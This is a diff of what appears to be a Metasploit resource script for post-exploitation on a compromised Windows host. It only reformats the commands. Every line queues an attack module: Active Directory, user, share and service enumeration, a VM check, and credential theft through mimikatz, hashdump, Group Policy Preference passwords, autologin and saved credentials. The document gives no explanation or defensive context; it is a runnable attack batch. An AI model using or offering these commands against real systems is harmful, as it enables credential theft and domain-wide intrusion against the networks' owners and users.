@@ -1,14 +1,38 @@
-sessions -i SESSION
-run post/windows/gather/enum_logged_on_users
-run post/windows/gather/enum_ad_computers
-run post/windows/gather/enum_ad_groups
-run post/windows/gather/enum_ad_users
-run post/windows/gather/credentials/windows_autologin
-run post/windows/gather/credentials/enum_saved_creds
-run post/windows/gather/credentials/gpp
-run post/windows/gather/credentials/mimikatz
-run post/windows/gather/hashdump
-run post/windows/gather/enum_domain
-run post/windows/gather/enum_shares
-run post/windows/gather/enum_services
-run post/windows/gather/checkvm
+use post/windows/gather/enum_logged_on_users
+run
+
+use post/windows/gather/enum_ad_computers
+run
+
+use post/windows/gather/enum_ad_groups
+run
+
+use post/windows/gather/enum_ad_users
+run
+
+use post/windows/gather/credentials/windows_autologin
+run
+
+use post/windows/gather/credentials/enum_saved_creds
+run
+
+use post/windows/gather/credentials/gpp
+run
+
+use post/windows/gather/credentials/mimikatz
+run
+
+use post/windows/gather/hashdump
+run
+
+use post/windows/gather/enum_domain
+run
+
+use post/windows/gather/enum_shares
+run
+
+use post/windows/gather/enum_services
+run
+
+use post/windows/gather/checkvm
+run
